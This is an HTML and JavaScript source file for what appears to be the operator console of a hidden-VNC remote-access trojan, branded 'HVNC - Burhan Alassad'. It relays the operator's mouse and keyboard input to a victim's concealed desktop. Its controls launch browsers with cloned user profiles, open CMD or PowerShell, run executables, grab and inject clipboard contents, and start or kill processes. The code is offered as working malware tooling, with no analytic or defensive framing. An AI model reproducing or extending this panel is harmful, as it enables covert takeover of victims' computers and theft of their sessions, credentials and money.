<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>HVNC - Hidden Desktop</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Space+Grotesk:wght@400;500;600;700&display=swap"
    rel="stylesheet"
  />
  <style>
    :root {
      --bg-dark: #0a0e14;
      --bg-panel: #1a2535;
      --border: rgba(0, 150, 255, 0.3);
      --accent: #0096ff;
      --accent-hover: #00b4ff;
      --text: #e0e6ed;
      --text-muted: rgba(255, 255, 255, 0.5);
      --danger: #ff4444;
      --success: #00cc66;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--bg-dark);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .hvnc-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 16px;
      background: linear-gradient(180deg, rgba(0, 100, 200, 0.3) 0%, rgba(0, 50, 100, 0.2) 100%);
      border-bottom: 1px solid var(--border);
    }

    .hvnc-title {
      font-size: 16px;
      font-weight: 600;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .hvnc-title-icon {
      font-size: 20px;
    }

    .hvnc-status {
      font-size: 12px;
      padding: 4px 10px;
      border-radius: 12px;
      background: rgba(0, 150, 255, 0.2);
      border: 1px solid var(--border);
    }

    .hvnc-status[data-state="active"] {
      background: rgba(0, 204, 102, 0.2);
      border-color: var(--success);
      color: var(--success);
    }

    .hvnc-status[data-state="error"] {
      background: rgba(255, 68, 68, 0.2);
      border-color: var(--danger);
      color: var(--danger);
    }

    .hvnc-main {
      display: flex;
      flex: 1;
      overflow: hidden;
    }

    /* Screen Area */
    .hvnc-screen-area {
      flex: 1;
      position: relative;
      background: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 400px;
    }

    .hvnc-screen-img {
      max-width: 100%;
      max-height: 100%;
      width: 100%;
      height: 100%;
      object-fit: contain;
      display: none;
      /* Prevent image selection and dragging */
      user-select: none;
      -webkit-user-drag: none;
      pointer-events: none;
    }

    .hvnc-screen-img.active {
      display: block;
    }
    
    /* Screen area should capture all input */
    .hvnc-screen-area {
      user-select: none;
      cursor: crosshair;
    }

    .hvnc-screen-placeholder {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: var(--text-muted);
      gap: 12px;
    }

    .hvnc-screen-placeholder.hidden {
      display: none;
    }

    .hvnc-screen-icon {
      font-size: 64px;
      opacity: 0.5;
    }

    .hvnc-screen-text {
      font-size: 16px;
      opacity: 0.6;
    }

    /* Control Panel */
    .hvnc-control-panel {
      width: 200px;
      background: var(--bg-panel);
      border-left: 1px solid var(--border);
      padding: 12px;
      display: flex;
      flex-direction: column;
      gap: 8px;
      overflow-y: auto;
    }

    .hvnc-panel-btn {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 10px 12px;
      background: rgba(0, 150, 255, 0.1);
      border: 1px solid var(--border);
      border-radius: 6px;
      color: var(--text);
      font-size: 13px;
      font-family: inherit;
      cursor: pointer;
      transition: all 0.15s ease;
    }

    .hvnc-panel-btn:hover {
      background: rgba(0, 150, 255, 0.2);
      border-color: var(--accent);
    }

    .hvnc-panel-btn:active {
      transform: scale(0.98);
    }

    .hvnc-panel-icon {
      font-size: 16px;
    }

    /* Settings */
    .hvnc-panel-settings {
      margin-top: auto;
      padding-top: 12px;
      border-top: 1px solid var(--border);
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .hvnc-setting {
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .hvnc-setting label {
      font-size: 11px;
      color: var(--text-muted);
    }

    .hvnc-setting input[type="range"] {
      width: 100%;
      height: 4px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 2px;
      appearance: none;
      cursor: pointer;
    }

    .hvnc-setting input[type="range"]::-webkit-slider-thumb {
      appearance: none;
      width: 14px;
      height: 14px;
      background: var(--accent);
      border-radius: 50%;
      cursor: pointer;
    }

    /* Footer */
    .hvnc-panel-footer {
      padding-top: 12px;
      border-top: 1px solid var(--border);
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .hvnc-panel-footer label {
      font-size: 11px;
      color: var(--text-muted);
    }

    .hvnc-panel-footer select {
      width: 100%;
      padding: 8px 10px;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border);
      border-radius: 6px;
      color: var(--text);
      font-size: 13px;
      font-family: inherit;
      cursor: pointer;
    }

    .hvnc-ok-btn {
      width: 100%;
      padding: 10px;
      background: var(--accent);
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 14px;
      font-weight: 500;
      font-family: inherit;
      cursor: pointer;
      transition: all 0.15s ease;
    }

    .hvnc-ok-btn:hover {
      background: var(--accent-hover);
    }

    /* Dialog Styles */
    .hvnc-dialog {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.7);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }

    .hvnc-dialog-content {
      background: var(--bg-panel);
      border: 1px solid var(--border);
      border-radius: 12px;
      min-width: 320px;
      max-width: 90vw;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
    }

    .hvnc-dialog-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 16px;
      border-bottom: 1px solid var(--border);
      font-weight: 600;
    }

    .hvnc-dialog-close {
      width: 24px;
      height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(255, 60, 60, 0.2);
      border: 1px solid rgba(255, 60, 60, 0.4);
      border-radius: 4px;
      color: #ff6b6b;
      font-size: 18px;
      cursor: pointer;
    }

    .hvnc-dialog-body {
      padding: 16px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .field {
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .field label {
      font-size: 12px;
      color: var(--text-muted);
    }

    .field input,
    .field textarea {
      padding: 10px 12px;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border);
      border-radius: 6px;
      color: var(--text);
      font-size: 14px;
      font-family: inherit;
    }

    .field input:focus,
    .field textarea:focus {
      outline: none;
      border-color: var(--accent);
    }

    .primary {
      padding: 10px 16px;
      background: var(--accent);
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 14px;
      font-weight: 500;
      font-family: inherit;
      cursor: pointer;
    }

    .primary:hover {
      background: var(--accent-hover);
    }

    .danger {
      padding: 10px 16px;
      background: var(--danger);
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 14px;
      font-weight: 500;
      font-family: inherit;
      cursor: pointer;
    }

    .browser-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 8px;
    }

    .browser-btn {
      padding: 10px 12px;
      background: rgba(0, 150, 255, 0.1);
      border: 1px solid var(--border);
      border-radius: 6px;
      color: var(--text);
      font-size: 13px;
      font-family: inherit;
      cursor: pointer;
      transition: all 0.15s ease;
    }

    .browser-btn:hover {
      background: rgba(0, 150, 255, 0.2);
      border-color: var(--accent);
    }

    .toggle-field {
      flex-direction: row;
      align-items: center;
      gap: 8px;
    }

    .toggle-field input[type="checkbox"] {
      width: 18px;
      height: 18px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="hvnc-header">
    <div class="hvnc-title">
      <span class="hvnc-title-icon">üñ•Ô∏è</span>
      <span>HVNC - Burhan Alassad</span>
    </div>
    <div class="hvnc-status" id="hvncStatus" data-state="">Idle</div>
  </div>

  <div class="hvnc-main">
    <!-- HVNC Screen Preview -->
    <div class="hvnc-screen-area">
      <img id="hvncScreenImg" class="hvnc-screen-img" alt="HVNC Screen" />
      <div class="hvnc-screen-placeholder" id="hvncScreenPlaceholder">
        <span class="hvnc-screen-icon">üñ•Ô∏è</span>
        <span class="hvnc-screen-text">Hidden Desktop</span>
        <span class="hvnc-screen-text" style="font-size: 12px;">Waiting for connection...</span>
      </div>
    </div>

    <!-- HVNC Control Panel -->
    <div class="hvnc-control-panel">
      <button class="hvnc-panel-btn" type="button" data-hvnc-action="browsers">
        <span class="hvnc-panel-icon">üåê</span> Browsers
      </button>
      <button class="hvnc-panel-btn" type="button" data-hvnc-action="cmd">
        <span class="hvnc-panel-icon">‚¨õ</span> CMD
      </button>
      <button class="hvnc-panel-btn" type="button" data-hvnc-action="powershell">
        <span class="hvnc-panel-icon">üîµ</span> PowerShell
      </button>
      <button class="hvnc-panel-btn" type="button" data-hvnc-action="explorer">
        <span class="hvnc-panel-icon">üìÅ</span> Explorer
      </button>
      <button class="hvnc-panel-btn" type="button" data-hvnc-action="run">
        <span class="hvnc-panel-icon">‚¨áÔ∏è</span> Launch .EXE
      </button>
      <button class="hvnc-panel-btn" type="button" data-hvnc-action="get_clipboard">
        <span class="hvnc-panel-icon">üìã</span> Get Clipboard
      </button>
      <button class="hvnc-panel-btn" type="button" data-hvnc-action="send_clipboard">
        <span class="hvnc-panel-icon">üì§</span> Send Clipboard
      </button>
      <button class="hvnc-panel-btn" type="button" data-hvnc-action="start_process">
        <span class="hvnc-panel-icon">‚ñ∂Ô∏è</span> Start Process
      </button>
      <button class="hvnc-panel-btn" type="button" data-hvnc-action="kill_process">
        <span class="hvnc-panel-icon">üü•</span> Kill Process
      </button>

      <!-- Settings -->
      <div class="hvnc-panel-settings">
        <div class="hvnc-setting">
          <label>Interval (ms): <span id="hvncIntervalValue">500</span></label>
          <input type="range" id="hvncIntervalSlider" min="100" max="2000" value="500" step="100" />
        </div>
        <div class="hvnc-setting">
          <label>Quality: <span id="hvncQualityValue">50</span>%</label>
          <input type="range" id="hvncQualitySlider" min="10" max="100" value="50" step="5" />
        </div>
        <div class="hvnc-setting">
          <label>Resize: <span id="hvncResizeValue">50</span>%</label>
          <input type="range" id="hvncResizeSlider" min="25" max="100" value="50" step="5" />
        </div>
      </div>

      <!-- Window control -->
      <div class="hvnc-panel-footer">
        <label>Window</label>
        <select id="hvncWindowAction">
          <option value="close">Close</option>
          <option value="minimize">Minimize</option>
          <option value="maximize">Maximize</option>
        </select>
        <button id="hvncOkBtn" class="hvnc-ok-btn" type="button">OK</button>
      </div>
    </div>
  </div>

  <!-- Browser Selection Dialog -->
  <div id="hvncBrowserDialog" class="hvnc-dialog" style="display: none;">
    <div class="hvnc-dialog-content">
      <div class="hvnc-dialog-header">
        <span>Select Browser</span>
        <button class="hvnc-dialog-close" type="button">&times;</button>
      </div>
      <div class="hvnc-dialog-body">
        <div class="field toggle-field">
          <input type="checkbox" id="hvncCloneProfile" checked />
          <label for="hvncCloneProfile">Clone user profile</label>
        </div>
        <div class="browser-grid">
          <button class="browser-btn" type="button" data-browser="chrome">Chrome</button>
          <button class="browser-btn" type="button" data-browser="edge">Edge</button>
          <button class="browser-btn" type="button" data-browser="firefox">Firefox</button>
          <button class="browser-btn" type="button" data-browser="opera">Opera</button>
          <button class="browser-btn" type="button" data-browser="brave">Brave</button>
          <button class="browser-btn" type="button" data-browser="safari">Safari</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Run EXE Dialog -->
  <div id="hvncRunDialog" class="hvnc-dialog" style="display: none;">
    <div class="hvnc-dialog-content">
      <div class="hvnc-dialog-header">
        <span>Launch Executable</span>
        <button class="hvnc-dialog-close" type="button">&times;</button>
      </div>
      <div class="hvnc-dialog-body">
        <div class="field">
          <label for="hvncExePath">Executable Path</label>
          <input type="text" id="hvncExePath" placeholder="C:\path\to\program.exe" />
        </div>
        <div class="field">
          <label for="hvncExeArgs">Arguments (optional)</label>
          <input type="text" id="hvncExeArgs" placeholder="" />
        </div>
        <button id="hvncRunExeBtn" class="primary" type="button">Launch</button>
      </div>
    </div>
  </div>

  <!-- Send Clipboard Dialog -->
  <div id="hvncClipboardDialog" class="hvnc-dialog" style="display: none;">
    <div class="hvnc-dialog-content">
      <div class="hvnc-dialog-header">
        <span>Send Clipboard</span>
        <button class="hvnc-dialog-close" type="button">&times;</button>
      </div>
      <div class="hvnc-dialog-body">
        <div class="field">
          <label for="hvncClipboardText">Text to send</label>
          <textarea id="hvncClipboardText" rows="4" placeholder="Enter text..."></textarea>
        </div>
        <button id="hvncSendClipboardBtn" class="primary" type="button">Send</button>
      </div>
    </div>
  </div>

  <!-- Start Process Dialog -->
  <div id="hvncProcessDialog" class="hvnc-dialog" style="display: none;">
    <div class="hvnc-dialog-content">
      <div class="hvnc-dialog-header">
        <span>Start Process</span>
        <button class="hvnc-dialog-close" type="button">&times;</button>
      </div>
      <div class="hvnc-dialog-body">
        <div class="field">
          <label for="hvncProcessPath">Command or Path</label>
          <input type="text" id="hvncProcessPath" placeholder="notepad.exe or full path" />
        </div>
        <div class="field">
          <label for="hvncProcessArgs">Arguments (optional)</label>
          <input type="text" id="hvncProcessArgs" placeholder="" />
        </div>
        <button id="hvncStartProcessBtn" class="primary" type="button">Start</button>
      </div>
    </div>
  </div>

  <!-- Kill Process Dialog -->
  <div id="hvncKillDialog" class="hvnc-dialog" style="display: none;">
    <div class="hvnc-dialog-content">
      <div class="hvnc-dialog-header">
        <span>Kill Process</span>
        <button class="hvnc-dialog-close" type="button">&times;</button>
      </div>
      <div class="hvnc-dialog-body">
        <div class="field">
          <label for="hvncKillPid">Process ID (PID) or Name</label>
          <input type="text" id="hvncKillPid" placeholder="1234 or chrome.exe" />
        </div>
        <button id="hvncKillProcessBtn" class="danger" type="button">Kill</button>
      </div>
    </div>
  </div>

  <script>
    /**
     * HVNC Window - Standalone window for Hidden Desktop control
     * Communicates with parent window via postMessage
     */
    (() => {
      "use strict";

      const parentWindow = window.opener;
      if (!parentWindow) {
        console.error("HVNC Window must be opened from main application");
        document.querySelector(".hvnc-screen-text").textContent = "Error: Window must be opened from main app";
        return;
      }

      // DOM Elements
      const dom = {
        status: document.getElementById("hvncStatus"),
        screenArea: document.querySelector(".hvnc-screen-area"),
        screenImg: document.getElementById("hvncScreenImg"),
        screenPlaceholder: document.getElementById("hvncScreenPlaceholder"),
        intervalSlider: document.getElementById("hvncIntervalSlider"),
        intervalValue: document.getElementById("hvncIntervalValue"),
        qualitySlider: document.getElementById("hvncQualitySlider"),
        qualityValue: document.getElementById("hvncQualityValue"),
        resizeSlider: document.getElementById("hvncResizeSlider"),
        resizeValue: document.getElementById("hvncResizeValue"),
        windowAction: document.getElementById("hvncWindowAction"),
        okBtn: document.getElementById("hvncOkBtn"),
        browserDialog: document.getElementById("hvncBrowserDialog"),
        runDialog: document.getElementById("hvncRunDialog"),
        clipboardDialog: document.getElementById("hvncClipboardDialog"),
        processDialog: document.getElementById("hvncProcessDialog"),
        killDialog: document.getElementById("hvncKillDialog"),
        cloneProfileCheckbox: document.getElementById("hvncCloneProfile"),
        exePath: document.getElementById("hvncExePath"),
        exeArgs: document.getElementById("hvncExeArgs"),
        clipboardText: document.getElementById("hvncClipboardText"),
        processPath: document.getElementById("hvncProcessPath"),
        processArgs: document.getElementById("hvncProcessArgs"),
        killPid: document.getElementById("hvncKillPid"),
      };

      // Settings
      const settings = {
        interval: 500,
        quality: 50,
        resize: 50,
      };
      
      // Input state tracking
      const inputState = {
        pressedKeys: new Set(),
        mouseButtonsDown: new Set(),
      };

      /**
       * Send message to parent window
       */
      function sendToParent(type, data = {}) {
        if (parentWindow && !parentWindow.closed) {
          parentWindow.postMessage({ type: "hvnc_window", action: type, ...data }, "*");
        }
      }

      /**
       * Update status display
       */
      function setStatus(message, state) {
        if (dom.status) {
          dom.status.textContent = message;
          dom.status.setAttribute("data-state", state || "");
        }
      }

      /**
       * Update screen image
       */
      function updateScreenImage(imageData) {
        const src = imageData
          ? (imageData.startsWith("data:") ? imageData : `data:image/jpeg;base64,${imageData}`)
          : null;

        if (dom.screenImg) {
          if (src) {
            dom.screenImg.src = src;
            dom.screenImg.classList.add("active");
            if (dom.screenPlaceholder) {
              dom.screenPlaceholder.classList.add("hidden");
            }
          } else {
            dom.screenImg.classList.remove("active");
            if (dom.screenPlaceholder) {
              dom.screenPlaceholder.classList.remove("hidden");
            }
          }
        }
      }

      /**
       * Show dialog
       */
      function showDialog(dialog) {
        if (dialog) {
          dialog.style.display = "flex";
        }
      }

      /**
       * Close dialog
       */
      function closeDialog(dialog) {
        if (dialog) {
          dialog.style.display = "none";
        }
      }

      /**
       * Close all dialogs
       */
      function closeAllDialogs() {
        [dom.browserDialog, dom.runDialog, dom.clipboardDialog, 
         dom.processDialog, dom.killDialog].forEach(d => closeDialog(d));
      }

      /**
       * Handle action button click
       */
      function handleAction(action) {
        switch (action) {
          case "browsers":
            showDialog(dom.browserDialog);
            break;
          case "cmd":
            sendToParent("action", { hvncAction: "launch_cmd" });
            break;
          case "powershell":
            sendToParent("action", { hvncAction: "launch_powershell" });
            break;
          case "explorer":
            sendToParent("action", { hvncAction: "launch_explorer" });
            break;
          case "run":
            showDialog(dom.runDialog);
            break;
          case "get_clipboard":
            sendToParent("action", { hvncAction: "get_clipboard" });
            break;
          case "send_clipboard":
            showDialog(dom.clipboardDialog);
            break;
          case "start_process":
            showDialog(dom.processDialog);
            break;
          case "kill_process":
            showDialog(dom.killDialog);
            break;
        }
      }

      /**
       * Launch browser
       */
      function launchBrowser(browser) {
        const cloneProfile = dom.cloneProfileCheckbox ? dom.cloneProfileCheckbox.checked : true;
        sendToParent("action", { 
          hvncAction: "launch_browser", 
          browser, 
          clone_profile: cloneProfile 
        });
        closeDialog(dom.browserDialog);
      }

      /**
       * Run custom executable
       */
      function runExe() {
        const path = dom.exePath ? dom.exePath.value.trim() : "";
        const args = dom.exeArgs ? dom.exeArgs.value.trim() : "";
        
        if (!path) {
          alert("Please enter executable path");
          return;
        }

        sendToParent("action", { hvncAction: "run_exe", path, args });
        closeDialog(dom.runDialog);
        
        if (dom.exePath) dom.exePath.value = "";
        if (dom.exeArgs) dom.exeArgs.value = "";
      }

      /**
       * Send clipboard to hidden desktop
       */
      function sendClipboard() {
        const text = dom.clipboardText ? dom.clipboardText.value : "";
        
        if (!text) {
          alert("Please enter text to send");
          return;
        }

        sendToParent("action", { hvncAction: "send_clipboard", text });
        closeDialog(dom.clipboardDialog);
        
        if (dom.clipboardText) dom.clipboardText.value = "";
      }

      /**
       * Start process on hidden desktop
       */
      function startProcess() {
        const path = dom.processPath ? dom.processPath.value.trim() : "";
        const args = dom.processArgs ? dom.processArgs.value.trim() : "";
        
        if (!path) {
          alert("Please enter command or path");
          return;
        }

        sendToParent("action", { hvncAction: "start_process", path, args });
        closeDialog(dom.processDialog);
        
        if (dom.processPath) dom.processPath.value = "";
        if (dom.processArgs) dom.processArgs.value = "";
      }

      /**
       * Kill process on hidden desktop
       */
      function killProcess() {
        const target = dom.killPid ? dom.killPid.value.trim() : "";
        
        if (!target) {
          alert("Please enter PID or process name");
          return;
        }

        const pid = parseInt(target, 10);
        if (!isNaN(pid)) {
          sendToParent("action", { hvncAction: "kill_process", pid });
        } else {
          sendToParent("action", { hvncAction: "kill_process", name: target });
        }
        
        closeDialog(dom.killDialog);
        if (dom.killPid) dom.killPid.value = "";
      }

      /**
       * Handle messages from parent window
       */
      function handleParentMessage(event) {
        const data = event.data;
        if (!data || data.type !== "hvnc_parent") return;

        switch (data.action) {
          case "frame":
            updateScreenImage(data.frame);
            break;
          case "status":
            setStatus(data.message, data.state);
            break;
          case "settings":
            // Update settings from parent
            if (data.settings) {
              settings.interval = data.settings.interval || settings.interval;
              settings.quality = data.settings.quality || settings.quality;
              settings.resize = data.settings.resize || settings.resize;
              
              if (dom.intervalSlider) dom.intervalSlider.value = settings.interval;
              if (dom.intervalValue) dom.intervalValue.textContent = settings.interval;
              if (dom.qualitySlider) dom.qualitySlider.value = settings.quality;
              if (dom.qualityValue) dom.qualityValue.textContent = settings.quality;
              if (dom.resizeSlider) dom.resizeSlider.value = settings.resize;
              if (dom.resizeValue) dom.resizeValue.textContent = settings.resize;
            }
            break;
          case "clipboard_received":
            if (data.text !== undefined) {
              navigator.clipboard.writeText(data.text).then(() => {
                setStatus("Clipboard copied to local", "active");
              }).catch(() => {
                prompt("Clipboard content from hidden desktop:", data.text);
              });
            }
            break;
        }
      }

      // ===== Mouse/Keyboard Input Handling =====
      
      /**
       * Get cursor position relative to screen area, scaled to actual desktop resolution
       */
      function getCursorPosition(e) {
        if (!dom.screenArea || !dom.screenImg) return { x: 0, y: 0 };
        
        const rect = dom.screenArea.getBoundingClientRect();
        const imgRect = dom.screenImg.getBoundingClientRect();
        
        // Calculate position relative to the displayed image
        let x = e.clientX - imgRect.left;
        let y = e.clientY - imgRect.top;
        
        // Scale to actual desktop resolution (assuming 1920x1080)
        // The image is scaled to fit, so we need to reverse that
        const desktopWidth = 1920;  // Default desktop width
        const desktopHeight = 1080; // Default desktop height
        
        const scaleX = desktopWidth / imgRect.width;
        const scaleY = desktopHeight / imgRect.height;
        
        x = Math.round(x * scaleX);
        y = Math.round(y * scaleY);
        
        // Clamp to desktop bounds
        x = Math.max(0, Math.min(desktopWidth, x));
        y = Math.max(0, Math.min(desktopHeight, y));
        
        return { x, y };
      }
      
      /**
       * Map mouse button number to string
       */
      function mapMouseButton(button) {
        switch (button) {
          case 0: return "left";
          case 1: return "middle";
          case 2: return "right";
          default: return "left";
        }
      }
      
      /**
       * Send HVNC control command to parent
       */
      function sendHvncControl(payload) {
        sendToParent("hvnc_control", payload);
      }
      
      /**
       * Bind mouse and keyboard input events to screen area
       */
      function bindInputEvents() {
        if (!dom.screenArea) return;
        
        // Make screen area focusable
        dom.screenArea.setAttribute("tabindex", "0");
        
        // Prevent context menu
        dom.screenArea.addEventListener("contextmenu", (e) => {
          e.preventDefault();
        });
        
        // Mouse move
        dom.screenArea.addEventListener("mousemove", (e) => {
          const pos = getCursorPosition(e);
          sendHvncControl({
            type: "mouse_move",
            x: pos.x,
            y: pos.y,
          });
        });
        
        // Mouse down
        dom.screenArea.addEventListener("mousedown", (e) => {
          e.preventDefault();
          dom.screenArea.focus();
          
          const pos = getCursorPosition(e);
          const button = mapMouseButton(e.button);
          inputState.mouseButtonsDown.add(button);
          
          sendHvncControl({
            type: "mouse_down",
            x: pos.x,
            y: pos.y,
            button,
          });
        });
        
        // Mouse up
        dom.screenArea.addEventListener("mouseup", (e) => {
          const pos = getCursorPosition(e);
          const button = mapMouseButton(e.button);
          inputState.mouseButtonsDown.delete(button);
          
          sendHvncControl({
            type: "mouse_up",
            x: pos.x,
            y: pos.y,
            button,
          });
        });
        
        // Mouse wheel
        dom.screenArea.addEventListener("wheel", (e) => {
          e.preventDefault();
          const pos = getCursorPosition(e);
          
          // Normalize delta values
          let deltaX = e.deltaX;
          let deltaY = e.deltaY;
          
          // Convert to standard wheel units
          if (e.deltaMode === 1) { // DOM_DELTA_LINE
            deltaX *= 40;
            deltaY *= 40;
          } else if (e.deltaMode === 2) { // DOM_DELTA_PAGE
            deltaX *= 800;
            deltaY *= 600;
          }
          
          sendHvncControl({
            type: "mouse_scroll",
            x: pos.x,
            y: pos.y,
            delta_x: Math.round(deltaX),
            delta_y: Math.round(deltaY),
          });
        }, { passive: false });
        
        // Key down
        dom.screenArea.addEventListener("keydown", (e) => {
          e.preventDefault();
          
          // Handle printable characters directly
          const hasChord = e.ctrlKey || e.altKey || e.metaKey;
          const isPrintable = e.key && e.key.length === 1;
          
          if (isPrintable && !hasChord) {
            sendHvncControl({
              type: "text_input",
              text: e.key,
            });
            return;
          }
          
          // Handle special keys
          const key = e.code || e.key;
          if (!key) return;
          
          // Prevent repeat key events
          if (e.repeat && inputState.pressedKeys.has(key)) return;
          
          if (!inputState.pressedKeys.has(key)) {
            inputState.pressedKeys.add(key);
            sendHvncControl({
              type: "key_down",
              key,
            });
          }
        });
        
        // Key up
        dom.screenArea.addEventListener("keyup", (e) => {
          e.preventDefault();
          
          const key = e.code || e.key;
          if (!key) return;
          
          if (!inputState.pressedKeys.has(key)) return;
          
          inputState.pressedKeys.delete(key);
          sendHvncControl({
            type: "key_up",
            key,
          });
        });
        
        // Release all inputs when window loses focus
        window.addEventListener("blur", () => {
          // Release all mouse buttons
          inputState.mouseButtonsDown.forEach(button => {
            sendHvncControl({
              type: "mouse_up",
              x: 0,
              y: 0,
              button,
            });
          });
          inputState.mouseButtonsDown.clear();
          
          // Release all keys
          inputState.pressedKeys.forEach(key => {
            sendHvncControl({
              type: "key_up",
              key,
            });
          });
          inputState.pressedKeys.clear();
        });
      }

      /**
       * Initialize
       */
      function init() {
        // Listen for messages from parent
        window.addEventListener("message", handleParentMessage);
        
        // Bind mouse/keyboard input events
        bindInputEvents();

        // Action buttons
        document.querySelectorAll("[data-hvnc-action]").forEach(btn => {
          btn.addEventListener("click", () => {
            const action = btn.dataset.hvncAction;
            if (action) handleAction(action);
          });
        });

        // Browser buttons
        document.querySelectorAll("[data-browser]").forEach(btn => {
          btn.addEventListener("click", () => {
            const browser = btn.dataset.browser;
            if (browser) launchBrowser(browser);
          });
        });

        // Dialog close buttons
        document.querySelectorAll(".hvnc-dialog-close").forEach(btn => {
          btn.addEventListener("click", () => {
            const dialog = btn.closest(".hvnc-dialog");
            closeDialog(dialog);
          });
        });

        // Dialog backdrop click
        document.querySelectorAll(".hvnc-dialog").forEach(dialog => {
          dialog.addEventListener("click", (e) => {
            if (e.target === dialog) {
              closeDialog(dialog);
            }
          });
        });

        // Run EXE button
        const runExeBtn = document.getElementById("hvncRunExeBtn");
        if (runExeBtn) runExeBtn.addEventListener("click", runExe);

        // Send clipboard button
        const sendClipboardBtn = document.getElementById("hvncSendClipboardBtn");
        if (sendClipboardBtn) sendClipboardBtn.addEventListener("click", sendClipboard);

        // Start process button
        const startProcessBtn = document.getElementById("hvncStartProcessBtn");
        if (startProcessBtn) startProcessBtn.addEventListener("click", startProcess);

        // Kill process button
        const killProcessBtn = document.getElementById("hvncKillProcessBtn");
        if (killProcessBtn) killProcessBtn.addEventListener("click", killProcess);

        // Sliders
        if (dom.intervalSlider) {
          dom.intervalSlider.addEventListener("input", (e) => {
            const value = parseInt(e.target.value, 10);
            settings.interval = value;
            if (dom.intervalValue) dom.intervalValue.textContent = value;
            sendToParent("settings_changed", { setting: "interval", value });
          });
        }

        if (dom.qualitySlider) {
          dom.qualitySlider.addEventListener("input", (e) => {
            const value = parseInt(e.target.value, 10);
            settings.quality = value;
            if (dom.qualityValue) dom.qualityValue.textContent = value;
            sendToParent("settings_changed", { setting: "quality", value });
          });
        }

        if (dom.resizeSlider) {
          dom.resizeSlider.addEventListener("input", (e) => {
            const value = parseInt(e.target.value, 10);
            settings.resize = value;
            if (dom.resizeValue) dom.resizeValue.textContent = value;
            sendToParent("settings_changed", { setting: "resize", value });
          });
        }

        // OK button
        if (dom.okBtn) {
          dom.okBtn.addEventListener("click", () => {
            const action = dom.windowAction ? dom.windowAction.value : "close";
            if (action === "close") {
              window.close();
            }
          });
        }

        // Notify parent that window is ready
        sendToParent("ready");

        // Handle window close
        window.addEventListener("beforeunload", () => {
          sendToParent("closed");
        });

        console.log("HVNC Window initialized");
      }

      init();
    })();
  </script>
</body>
</html>
